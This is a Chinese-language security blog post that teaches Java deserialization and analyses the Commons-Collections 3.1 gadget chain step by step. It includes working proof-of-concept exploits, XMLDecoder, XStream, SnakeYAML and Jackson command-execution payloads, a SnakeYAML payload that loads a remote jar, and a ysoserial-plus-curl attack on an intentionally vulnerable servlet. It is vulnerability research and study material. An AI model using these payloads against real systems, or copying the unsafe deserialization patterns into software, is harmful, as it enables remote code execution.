---
title: JAVA反序列化 & Commons-Collections-3.1 反序列化分析
date: December 10th 2020
tags: [Java, 反序列化, Commons-Collections, 漏洞分析]
summary: 从 Java 序列化原理出发，深度分析 Commons-Collections 3.1 反序列化利用链的构造过程与执行流程。
---

# JAVA反序列化 & Commons-Collections-3.1 反序列化分析

## 基础知识

Java 序列化是指把 Java 对象转换为字节序列的过程，实现java.io.Serializable(内部序列化)或java.io.Externalizable(外部序列化)接口的类即可被序列化。反序列化是指把字节序列恢复为 Java 对象的过程。例如下面的两个方法就是用于序列化与反序列化：

- ObjectOutputStream类的 writeObject() 方法可以实现序列化对象
- ObjectInputStream 类的 readObject() 方法用于反序列化对象

支持反序列化的对象必须满足：

- 实现了java.io.Serializable接口，实现这个接口仅仅只用于标识这个类可序列化。
- 当前对象的所有类属性可序列化，如果有一个属性不想或不能被序列化，则需要指定transient，使得该属性将不会被序列化

需要注意的是反序列化类对象并不会调用该类构造方法，具体原因：

> 因为在反序列化创建类实例时使用了sun.reflect.ReflectionFactory.newConstructorForSerialization创建了一个反序列化专用的Constructor(反射构造方法对象)，使用这个特殊的Constructor可以绕过构造方法创建类实例。

## 简单例子

User.java

```java
package serialize;

import java.io.Serializable;

public class User implements Serializable{
    private String name;
    public void setName(String name) {
        this.name = name;
    }
    public String getName() {
        return name;
    }
}
```

Main.java

```java
package serialize;

import java.io.*;

public class Main {
    public static void main(String[] args) throws Exception{
        User user = new User();
        user.setName(("Threezh1"));

        byte[] serializeData = serialize(user); // 创建是一个字节型的数据
        FileOutputStream fout = new FileOutputStream("user.bin");
        fout.write(serializeData);
        fout.close();
        User user2 = (User)unserialize(serializeData);
        System.out.println(user2.getName());
    }

    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream btout = new ByteArrayOutputStream(); // 创建一个32字节（默认大小）的缓冲区
        ObjectOutputStream objOut = new ObjectOutputStream(btout); // 通过传入byte字节流来存储写入的对象
        objOut.writeObject(obj); // 将对象写入流中
        return btout.toByteArray(); // 创建一个新分配的字节数组。数组的大小和当前输出流的大小，内容是当前输出流的拷贝。
    }

    public static Object unserialize(final byte[] serialized) throws Exception {
        ByteArrayInputStream btin = new ByteArrayInputStream(serialized); // 接收字节数组作为参数创建
        ObjectInputStream objIn = new ObjectInputStream(btin); // 从输入流中读取Java对象
        return objIn.readObject();
    }
}
```

运行结果：

![-w936](https://i.imgur.com/bBYqGxO.jpg)

user.bin为对象序列化后的二进制文件：

![-w815](https://i.imgur.com/ismO1Rs.jpg)

> 根据序列化规范，aced代表java序列化数据的magic wordSTREAM_MAGIC,0005表示版本号STREAM_VERSION,73表示是一个对象TC_OBJECT,72表示这个对象的描述TC_CLASSDESC  
> 所以在日常测试中，如果解开类似Base64后，起始为aced打头，可以尝试使用反序列化的payload。

**自定义序列化(writeObject)和反序列化(readObject)**

实现了java.io.Serializable接口的类还可以定义如下方法(反序列化魔术方法)将会在类序列化和反序列化过程中调用：

- private void writeObject(ObjectOutputStream oos),自定义序列化。
- private void readObject(ObjectInputStream ois)，自定义反序列化。

如果readObject被序列化的类重写并且写入了危险的语句，反序列化该类时可能会被恶意利用(当然这种一般不会出现)：

Evil.java

```java
package evilSerialize;

import java.io.*;

public class Evil implements Serializable {
    public String cmd;

    private  void readObject(java.io.ObjectInputStream stream) throws Exception {
        stream.defaultReadObject();
        Runtime.getRuntime().exec(cmd);
    }
}
```

Main.java

```java
package evilSerialize;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class Main {
    public static void main(String[] args) throws Exception{
        Evil evil = new Evil();
        evil.cmd = "open /System/Applications/Calculator.app";

        byte[] serializeData = serialize(evil);
        unserialize(serializeData);
    }

    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(btout);
        objOut.writeObject(obj);
        return btout.toByteArray();
    }

    public static Object unserialize(final byte[] serialized) throws Exception {
        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(btin);
        return objIn.readObject();
    }
}
```

运行后则会执行命令：

![-w1004](https://i.imgur.com/nStca3F.jpg)

## 反序列化触发点扩展

除了基本的ObjectInputStream.readObject，还有其他的几种触发方式：

```plain
ObjectInputStream.readObject// 流转化为Object
ObjectInputStream.readUnshared // 流转化为Object
XMLDecoder.readObject // 读取xml转化为Object
Yaml.load// yaml字符串转Object
XStream.fromXML// XStream用于Java Object与xml相互转化
ObjectMapper.readValue// jackson中的api
JSON.parseObject// fastjson中的api
```

不同的使用场景：

• http参数，cookie，sesion，存储方式可能是base64（rO0），压缩后的base64（H4sl），MII等  
• Servlets HTTP，Sockets，Session管理器 包含的协议就包括JMX，RMI，JMS，JNDI等（\xac\xed）  
• xml Xstream,XMLDecoder等（HTTP Body：Content-Type:application/xml）  
• json(Jackson，fastjson) http请求中包含

### ObjectInputStream.readUnshared

跟`ObjectInputStream.readObject`类似，但readUnshared方法读取对象，不允许后续的readObject和readUnshared调用引用这次调用反序列化得到的对象，而readObject读取的对象可以。

### XMLDecoder.readObject

Main.java:

```java
package point_xmldecoder;

import java.beans.XMLDecoder;
import java.io.*;

public class Main{
    public static void main(String[] args){
        String poc = "/Users/threezh1/IdeaProjects/java_unserialize/src/point_xmldecoder/poc.xml";
        try {
            FileInputStream file = new FileInputStream(poc);
            XMLDecoder decoder = new XMLDecoder(file);
            decoder.readObject();
            decoder.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }
}
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java>
    <object class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
            <void index="0">
                <string>/bin/sh</string>
            </void>
            <void index="1">
                <string>-c</string>
            </void>
            <void index="2">
                <string>open -a Calculator</string>
            </void>
        </array>
        <void method="start"/>
    </object>
</java>
```

![-w1789](https://i.imgur.com/3scVJ4P.jpg)

### Yaml.load

添加SnakeYAML库：

```xml
<!-- https://mvnrepository.com/artifact/org.yaml/snakeyaml -->
<dependency>
    <groupId>org.yaml</groupId>
    <artifactId>snakeyaml</artifactId>
    <version>1.25</version>
</dependency>
```

访问URL的payload：

```java
import org.yaml.snakeyaml.Yaml;

public class Main {
    public static void main(String[] args) {
        String poc = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:3333/\"]]]]";
        Yaml yaml = new Yaml();
        yaml.load(poc);
    }
}
```

![-w1789](https://i.imgur.com/huBXwab.jpg)

RCE payload:

```java
import org.yaml.snakeyaml.Yaml;

public class Main {
    public static void main(String[] args) {
        String poc = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1/yaml-payload.jar\"]]]]\n";
        Yaml yaml = new Yaml();
        yaml.load(poc);
    }
}
```

同时要在自己的web服务下准备一个jar文件，可以参考：[https://github.com/artsploit/yaml-payload](https://github.com/artsploit/yaml-payload)  
AwesomeScriptEngineFactory.java里是被执行的java语句。

![-w1789](https://i.imgur.com/N1Cl43n.jpg)

### XStream.fromXML

添加XStream库

```xml
<dependency>
  <groupId>com.thoughtworks.xstream</groupId>
  <artifactId>xstream</artifactId>
  <version>1.4.10</version>
</dependency>
```

测试例子：

```java
import com.thoughtworks.xstream.XStream;

public class Main {
    public static void main(String[] args) {
        String payload = "<sorted-set>\n" +
                "    <string>foo</string>\n" +
                "    <dynamic-proxy>\n" +
                "    <interface>java.lang.Comparable</interface>\n" +
                "        <handler class=\"java.beans.EventHandler\">\n" +
                "            <target class=\"java.lang.ProcessBuilder\">\n" +
                "                <command>\n" +
                "                    <string>/bin/sh</string>\n" +
                "                    <string>-c</string>\n" +
                "                    <string>open /System/Applications/Calculator.app</string>\n" +
                "                </command>\n" +
                "            </target>\n" +
                "     <action>start</action>"+
                "        </handler>\n" +
                "    </dynamic-proxy>\n" +
                "</sorted-set>\n";
        XStream xStream = new XStream();
        xStream.fromXML(payload);
    }
}
```

![-w1788](https://i.imgur.com/S8HEB4Y.jpg)

### ObjectMapper.readValue

添加相应的库：

```xml
<!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind -->
<dependency>
    <groupId>com.fasterxml.jackson.core</groupId>
    <artifactId>jackson-databind</artifactId>
    <version>2.9.9</version>
</dependency>
<!-- https://mvnrepository.com/artifact/org.apache.xbean/xbean-reflect -->
<dependency>
    <groupId>org.apache.xbean</groupId>
    <artifactId>xbean-reflect</artifactId>
    <version>4.16</version>
</dependency>
```

JackJsonDemo.java:

```java
package point_jackjson;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

public class JackJsonDemo {
    public static void main(String[] args) throws IOException {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        String json = "{\"name\":\"Threezh1\",\"age\":20,\"cls\":[\"point_jackjson.Vuln\",{\"cmd\":\"open -a Calculator\"}]}";
        System.out.println(mapper.readValue(json, Person.class));
    }
}
```

Vuln.java:

```java
package point_jackjson;

import java.io.IOException;

public class Vuln {
    String cmd;

    Vuln(){
        System.out.println("init");
    }

    public String getCmd() {
        System.out.println("get");
        return cmd;
    }

    public void setCmd(String cmd) throws IOException {
        System.out.println("set");
        this.cmd = cmd;
        Runtime.getRuntime().exec(cmd);
    }
}
```

Person.java

```java
package point_jackjson;

public class Person {
    private String name;
    private Integer age;
    private Object cls;

    public Integer getAge() {
        return age;
    }

    public String getName() {
        return name;
    }

    public Object getCls() {
        return cls;
    }

    public void setCls(Object cls) {
        this.cls = cls;
    }

    public void setAge(Integer age) {
        this.age = age;
    }

    public void setName(String name) {
        this.name = name;
    }
}
```

![-w1789](https://i.imgur.com/pLkyS9A.jpg)

### JSON.parseObject

留到后面再说。

## 反射机制

对于任意一个类，都能够得到这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为java语言的反射机制。

其实在Java中定义的一个类本身也是一个对象，即java.lang.Class类的实例，这个实例称为类对象

- 类对象表示正在运行的 Java 应用程序中的类和接口
- 类对象没有公共构造方法，由 Java 虚拟机自动构造
- 类对象用于提供类本身的信息，比如有几种构造方法， 有多少属性，有哪些普通方法

要得到类的方法和属性，首先就要得到该类对象

获取类对象的三种方法：

- class.forName(“reflection.User”)
- User.class
- new User().getClass()

### 利用类对象创建对象

先获取到类对象，再通过类对象获取到构造器对象，再通过构造器对象创建一个对象。

```java
package reflection;

import java.lang.reflect.*;

public class CreateObject {
    public static void main(String[] args) throws Exception {
        Class UserClass = Class.forName("reflection.User"); // reflection目录下的User类
        Constructor constructor = UserClass.getConstructor(String.class); // 通过类对象获取到构造器对象
        User user = (User) constructor.newInstance("Threezh1"); // 利用构造器对象创建一个对象
        System.out.println(user.getName());
    }
}
```

```plain
方法 说明
getConstructor(Class...<?> parameterTypes)  获得该类中与参数类型匹配的公有构造方法
getConstructors()   获得该类的所有公有构造方法
getDeclaredConstructor(Class...<?> parameterTypes)  获得该类中与参数类型匹配的构造方法
getDeclaredConstructors()   获得该类所有构造方法
```

### 利用反射调用方法

```java
package reflection;

import java.lang.reflect.*;
import java.util.Arrays;

public class CallMethod {
    public static void main(String[] args) throws Exception {
        Class UserClass = Class.forName("reflection.User");
        Constructor constructor = UserClass.getConstructor(String.class);
        User user = (User) constructor.newInstance("Threezh1");
        Method[] methods = UserClass.getDeclaredMethods(); // 获得该类所有方法

        System.out.println(Arrays.toString(methods)); // 打印所有方法
        Method method = UserClass.getDeclaredMethod("setName", String.class); // 获取该类某个方法
        method.invoke(user, "Threezh1");
        System.out.println(user.getName());
    }
}
```

```plain
方法	说明
getMethod(String name, Class...<?> parameterTypes)  获得该类某个公有的方法
getMethods()    获得该类所有公有的方法
getDeclaredMethod(String name, Class...<?> parameterTypes)  获得该类某个方法
getDeclaredMethods()    获得该类所有方法
```

`method.invoke(user, "Threezh1")`中的invoke方法：

```plain
作用：调用包装在当前Method对象中的方法。
原型：Object invoke（Object obj,Object...args）
参数解释：
    obj：实例化后的对象
    args：用于方法调用的参数
返回：根据obj和args调用的方法的返回值
```

### 通过反射访问属性

```java
package reflection;

import java.lang.reflect.*;
import java.util.Arrays;

public class AccessAttribute {
    public static void main(String[] args) throws Exception {
        Class UserClass = Class.forName("reflection.User");
        Constructor constructor = UserClass.getConstructor(String.class);
        User user = (User) constructor.newInstance("sanzhi");

        Field[] fields = UserClass.getDeclaredFields(); // 获取所有属性对象
        System.out.println(Arrays.toString(fields));

        Field field = UserClass.getDeclaredField("name"); // 获取某个属性对
        field.setAccessible(true); // name是private属性，需要将其设置为可访问
        field.set(user, "Threezh1"); // 设置值

        System.out.println(user.getName());
    }
}
```

```plain
方法	说明
getField(String name)	获得某个公有的属性对象
getFields()	获得所有公有的属性对象
getDeclaredField(String name)	获得某个属性对
getDeclaredFields()	获得所有属性对象
```

### 通过反射执行命令

```java
package reflection;

public class Exec {
    public static void main(String[] args) throws Exception {
        Class runtimeClass = Class.forName("java.lang.Runtime");
        Object runtime = runtimeClass.getMethod("getRuntime").invoke(null); // getRuntime是静态方法，invoke时不需要传入对象
        runtimeClass.getMethod("exec", String.class).invoke(runtime, "open /System/Applications/Calculator.app");
    }
}
```

先通过getRuntime方法来获取RunTime的实例，再通过调用exec方法执行命令。  
参考：[java基础：java.lang.Runtime](https://www.jianshu.com/p/0e9a2f7b0736)

## Apache-CommonsCollections 反序列化利用初体验

这里利用3.2.1版本来进行测试，版本下载地址：[Apache Commons Collections » 3.2.1](https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1)

SimpleServlet.java

```java
package demo;

import javax.servlet.ServletInputStream;
import java.io.*;

public class SimpleServlet extends javax.servlet.http.HttpServlet {
    protected void doPost(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response) throws javax.servlet.ServletException, IOException {
        ServletInputStream sis = request.getInputStream();

        ObjectInputStream ois = new ObjectInputStream(sis);
        try {
            ois.readObject();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        ois.close();
    }

    protected void doGet(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response) throws javax.servlet.ServletException, IOException {
        PrintWriter out = response.getWriter();
        out.println("This is a demo");
    }
}
```

web.xml

```xml
<servlet>
    <servlet-name>SimpleServlet</servlet-name>
    <servlet-class>demo.SimpleServlet</servlet-class>
</servlet>
<servlet-mapping>
    <servlet-name>SimpleServlet</servlet-name>
    <url-pattern>/demo</url-pattern>
</servlet-mapping>
```

用ysoserial来生成payload：

```plain
java -jar ysoserial.jar CommonsCollections5 "open -a Calculator" > calc.payload
```

访问并执行payload：

```plain
curl "http://127.0.0.1:8080/demo" --data-binary "@./calc.payload"
```

![-w1791](https://i.imgur.com/57ex5sX.jpg)

## Apache CommonsCollections3.1 利用链分析

### 利用链复现

先引入commons-collections 3.1依赖包

```xml
<!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.1</version>
</dependency>
```

- 用ysoserial.jar复现

Main.class

```java
package vuln;

import java.io.*;

public class Main {
    public static void main(String[] args) throws Exception {
        FileInputStream fileInputStream = new FileInputStream("calc.payload");
        ObjectInputStream input = new ObjectInputStream(fileInputStream);
        Object object = input.readObject();
        input.close();
        fileInputStream.close();
    }
}

```

用`ysoserial.jar`生成payload：

```plain
java -jar ysoserial.jar CommonsCollections1 "open -a Calculator" > calc.payload
```

运行即会执行`open -a Calculator`命令：

![-w1790](https://i.imgur.com/kmXWnqO.jpg)

- 用POC复现

(网上有很多种POC，我这里以最终写出来的poc为例)

```java
package vuln;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.reflect.*;
import java.io.*;
import java.util.HashMap;
import java.util.Map;

public class step4 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[] {String.class, Class[].class},
                        new Object[] {"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[] {Object.class, Object[].class},
                        new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] {String.class},
                        new Object[] {"open -a Calculator"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value", "Threezh1");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        // 获取了AnnotationInvocationHandler类对象
        Class AnnotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        // 获取了构造方法
        Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
        // 将构造方法设置为可访问的状态
        cons.setAccessible(true);
        // 创建实例
        Object ins = cons.newInstance(java.lang.annotation.Retention.class, outerMap);

        ByteArrayOutputStream exp = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(exp);
        oos.writeObject(ins); // 将ins序列化
        oos.flush();
        oos.close();

        ByteArrayInputStream out = new ByteArrayInputStream(exp.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(out);
        Object obj = (Object) ois.readObject(); // 将ins反序列化
    }
}
```

![-w1791](https://i.imgur.com/cLfFw0R.jpg)

之后的调用链分析都是以POC复现为基础的。

### 调用链分析

根据调用链中不同的类、函数，一共分为了以下部分：

1. transform反射执行命令
2. ChainedTransformer循环调用transform
3. jdk1.7下的AnnotationInvocationHandler中readObject的调用过程

#### transform反射执行命令

通过刚刚的复现例子，我们能够跟踪到最终执行命令的点在：/org/apache/commons/collections/functors/InvokerTransformer.class 中的transform方法处。

```java
public class InvokerTransformer implements Transformer, Serializable {
    private final String iMethodName;
    private final Class[] iParamTypes;
    private final Object[] iArgs;
    // 省略
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    }

    public Object transform(Object input) {
        if (input == null) {
            return null;
        } else {
            try {
                Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs); // 最终执行命令的点
            } catch (NoSuchMethodException var5) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
            } catch (IllegalAccessException var6) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
            } catch (InvocationTargetException var7) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var7);
            }
        }
    }
}
```

![-w1792](https://i.imgur.com/c0PEy2y.jpg)

这个类实现了Transformer接口：

```java
package org.apache.commons.collections;

public interface Transformer {
    Object transform(Object var1);
}
```

对于这个执行语句的点，可以写出下面的命令执行测试例子：

```java
package vuln;

import org.apache.commons.collections.functors.InvokerTransformer;

public class EvalObject {
    public static void main(String[] args) {
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",
                new Class[] {String.class },
                new Object[] {"open -a Calculator"});
        invokerTransformer.transform(Runtime.getRuntime());
    }
}
```

其中反射的语句等同于：

```java
Class runtimeClass = Class.forName("java.lang.Runtime"); //获取类对象
Object runtime = runtimeClass.getMethod("getRuntime").invoke(null); //获取实例
runtimeClass.getMethod("exec", String.class).invoke(runtime, "open -a Calculator"); // 调用exec方法
```

transform方法可以传递进入一个类实例并调用getClass()获取类对象，再通过类对象获取exec方法进行反射调用。

#### ChainedTransformer循环调用transform

但是这里如果要触发反射的话，必须要调用`invokerTransformer.transform`这个方法，并且还得传入一个`Runtime.getRuntime()`来进行利用。在`org/apache/commons/collections/functors/ChainedTransformer.class`的transform方法处就正好有这么一个利用点：

```java
public class ChainedTransformer implements Transformer, Serializable {
    private final Transformer[] iTransformers;
    // 部分省略
    public ChainedTransformer(Transformer[] transformers) {
        this.iTransformers = transformers;
    }

    public Object transform(Object object) {
        for(int i = 0; i < this.iTransformers.length; ++i) {
            object = this.iTransformers[i].transform(object);
        }
        return object;
    }
}
```

同样可以构造出一个利用的命令执行测试例子如下：

```java
package vuln;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class step2 {
    public static void main(String[] args) {
        Transformer[] transformers = new Transformer[] {
                // 1. 传入一个Runtime类对象，在循环中调用transform时会返回原本的类对象
                // org/apache/commons/collections/functors/ConstantTransformer.class
                new ConstantTransformer(Runtime.class),
                // 2. 反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法
                new InvokerTransformer("getMethod",
                        new Class[] {String.class, Class[].class}, // getMethod参数类型,第一个为函数名,第二个为函数的参数
                        new Object[] {"getRuntime", new Class[0]}), // 参数值
                // 3. 反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象
                new InvokerTransformer("invoke",
                        new Class[] {Object.class, Object[].class},
                        new Object[] {null, new Object[0] }),
                // 4. 反射调用exec方法
                new InvokerTransformer("exec",
                        new Class[] {String.class},
                        new Object[] {"open -a Calculator"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        transformerChain.transform("");
    }
}
```

这个地方我理解起来比较慢，把每次循环都尝试截图出来分析才能明白。`transformerChain.transform`的调用过程类似于“套娃”，分别循环地传入反射最终调用exec方法执行命令。这个过程一共经历了4次循环，每一次循环的大致过程如下：

1. ConstantTransformer.transform()返回Runtime类对象赋值给Object
2. InvokerTransformer.transform("getMethod")获取到Runtime.getRuntime()方法赋值给Object。transform方法有已经存在了一个getMethod方法用于调用我们传入的getMethod，所以这里传入的getMethod方法名只是为了通过反射获取到一个getRuntime()方法。(稍微有点绕，建议把transform方法里的调用语句多看几遍)
3. InvokerTransformer.transform("invoke")调用了invoke方法创建了一个Runtime实例化对象赋值给Object。因为getRuntime()方法不需要参数，所以传递进去的第一个参数为null，第二个参数为new Object[0]就是传一个长度为1的Object数组过去，内容也为null。
4. 最后反射调用exec执行命令

现在相比于之前直接调用`invokerTransformer.transform`方法来说，只需要传递一个空值即可。目前来说还是不够，接着在`/org/apache/commons/collections/map/TransformedMap.class`里找到了一个可以调用`transformerChain.transform`的方法：

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package org.apache.commons.collections.map;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Iterator;
import java.util.Map;
import java.util.Map.Entry;
import org.apache.commons.collections.Transformer;

public class TransformedMap extends AbstractInputCheckedMapDecorator implements Serializable {
    protected final Transformer keyTransformer;
    protected final Transformer valueTransformer;

    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        return new TransformedMap(map, keyTransformer, valueTransformer); // 在这里获取TransformedMap实例
    }

    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        super(map);
        this.keyTransformer = keyTransformer;
        this.valueTransformer = valueTransformer; // valueTransformer是可控的
    }

    protected Object transformValue(Object object) {
        // 这里调用了valueTransformer.transform()方法
        return this.valueTransformer == null ? object : this.valueTransformer.transform(object);
    }

    protected Object checkSetValue(Object value) {
        // 这里也调用了valueTransformer.transform()方法
        return this.valueTransformer.transform(value);
    }

    public Object put(Object key, Object value) {
        key = this.transformKey(key);
        value = this.transformValue(value); // 调用transformValue
        return this.getMap().put(key, value);
    }
}
```

通过`decorate`方法我们可以获取一个`TransformedMap`实例，并且`this.valueTransformer`还是可控的，可以将其赋值为`ChainedTransformer`对象，当调用这个类的`checkSetValue`方法或者`transformValue`方法时就可以调用`ChainedTransformer`对象的`transform`方法了。

写出命令执行测试例子如下(这里是通过`put`方法间接调用`this.transformValue`方法进行利用)：

```java
package vuln;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;

public class step3 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[] {String.class, Class[].class},
                        new Object[] {"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[] {Object.class, Object[].class},
                        new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] {String.class},
                        new Object[] {"open -a Calculator"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap(); // 创建一个Map传递给decorate函数获取实例
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("key", "value"); // 触发transformValue方法
    }
}
```

![-w1790](https://i.imgur.com/8DExRJW.jpg)

目前来说，只需要寻找到一个被重写了的readObject方法，其中可以调用TransformedMap的`put`方法或者直接调用的`checkSetValue`和`transformValue`方法即可。

#### jdk1.7下的AnnotationInvocationHandler中readObject的调用过程

在jdk小于等于1.7时，`jdk1.7.0_80.jdk/Contents/Home/jre/lib/rt.jar!/sun/reflect/annotation/AnnotationInvocationHandler.class`中的readObject中有存在一个setValue方法：

```java
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
    var1.defaultReadObject();
    AnnotationType var2 = null;

    try {
        var2 = AnnotationType.getInstance(this.type);
    } catch (IllegalArgumentException var9) {
        throw new InvalidObjectException("Non-annotation type in annotation serial stream");
    }

    Map var3 = var2.memberTypes();
    Iterator var4 = this.memberValues.entrySet().iterator(); // entrySet() //返回此映射中包含的映射关系的 Set 视图。 Map.Entry表示映射关系; iterator() 返回该集合的迭代器对象

    while(var4.hasNext()) {
        Entry var5 = (Entry)var4.next();
        String var6 = (String)var5.getKey();
        Class var7 = (Class)var3.get(var6);
        if (var7 != null) {
            Object var8 = var5.getValue();
            if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                // 存在一个setValue方法
                var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
            }
        }
    }

}
```

跟入这个`setValue`方法到`/org/apache/commons/collections/map/AbstractInputCheckedMapDecorator.class`。可以看到这里所调用的就是`TransformedMap`的`checkSetValue`方法。原因是`TransformedMap`类是继承了`AbstractInputCheckedMapDecorator`这个抽象类，`MapEntry`是这个抽象类的一个静态类，我们传入的第二个参数是`TransformedMap`对象，从`this.memberValues`到`var4`再传递到`var5`调用`setValue`。所以`this.parent`也就是指的`TransformedMap`类了(因为我对java的这种类型的转换了解的太浅，所以传递的过程是比较粗略的理解)。

![-w1788](https://i.imgur.com/7ueL8sq.jpg)

![-w1789](https://i.imgur.com/GQ5l6lU.jpg)

到这里就把poc的所有过程全部串起来了，从`setValue`开始，调用`checkSetValue`，进而触发`ChainedTransformer`对象的`transform`方法，循环嵌套最终执行命令。

#### 关于java.lang.annotation.Retention的疑问

这里还有最后一个疑问，就是为什么第一个参数我们传递的是`java.lang.annotation.Retention`，自己调试了半天没看出来，在先知的一篇文章上找到了如下说明：

> 我发现这个问题和注解类中有无定义方法有关。只有定义了方法的注解才能触发 POC 。例如`java.lang.annotation.Retention`、`java.lang.annotation.Target` 都可以触发，而`java.lang.annotation.Documented` 则不行。

为什么`java.lang.annotation.Documented`不行呢？ 

可以跟一下传递的参数，会发现，`innerMap.put("value", "hello");`中，第一个键名只能为`value`。这个问题的原因是在调用`setValue`前有一个对`var7`变量的判断，而这个`var7`变量的值是从`var3`中获取到的，`var3`是`var2.memberTypes();`获取到的，通过get方法获取了键名为`var6`的值，`var6`其实就是我们传递的参数中的第一个键名。因为`var2.memberTypes();`默认返回的就是一个带有`value`的键名，所以如果传递的参数的第一个键名与这个值不相同的话，获取到的`var7`就为空，也就无法调动到`setValue`那里去了。而`java.lang.annotation.Documented`经过`memberTypes();`返回的是一个空值，所以就不行。(跟它的定义方法中是否有`RetentionPolicy value()`有关，目前暂只作了解)

![-w1790](https://i.imgur.com/pSaejoU.jpg)

![-w1790](https://i.imgur.com/DWjC7ta.jpg)

![-w1276](https://i.imgur.com/vcB9nY7.jpg)

#### 总结

引用先知上一篇文章的图：

![](https://i.imgur.com/qOaisHz.jpg)

## 参考

- Java反序列化漏洞原理解析
- 【websec】ysoserial反序列化研究
- Java反序列化备忘录
- Java SnakeYaml反序列化
- Java SnakeYaml反序列化漏洞
- Jackson-databind 反序列化漏洞分析 (CVE-2020-8840)
- Jackson-databind 反序列化分析
- Java反序列化学习之Commons-Collections1
- Java入坑：Apache-Commons-Collections-3.1 反序列化漏洞分析
- commons-collections-3.1 反序列化分析